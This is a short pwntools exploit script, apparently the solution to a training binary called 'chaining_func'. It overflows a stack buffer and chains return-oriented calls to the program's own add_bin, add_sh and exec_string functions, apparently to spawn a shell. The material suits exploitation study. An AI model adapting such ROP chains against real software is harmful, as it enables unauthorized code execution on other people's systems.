#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./chaining_func
from pwn import *
import os
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chaining_func')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

'''
0x5655554d  exec_string
0x56555578  add_bin
0x565555c5  add_sh
0x56555617  vulnerable_function
0x56555642  main
`python -c 'from pwn import *; print "A"*108+"B"*4+p32(0x56555578)+p32(0x565553bd)+p32(0xdeadbeef)+p32(0x565555c5)+p32(0x565555c2)+p32(0xcafebabe)+p32(0xbadf00d)+p32(0x5655554d)'`
ropper --search "pop ???; pop ???; ret;"
'''
padding="A"*104
saved_ebp="B"*8
add_bin=p32(0x56555578)
pop_ret=p32(0x565553bd)
add_bin_arg1=p32(0xdeadbeef)
add_sh=p32(0x565555c5)
pop_pop_ret=p32(0x565555c2)
add_sh_arg1=p32(0xcafebabe)
add_sh_arg2=p32(0xbadf00d)
exec_string=p32(0x5655554d)
payload = padding + saved_ebp + add_bin + pop_ret + add_bin_arg1 + add_sh + pop_pop_ret + add_sh_arg1 + add_sh_arg2 + exec_string
os.system("./chaining_func \"%s\"" % payload)

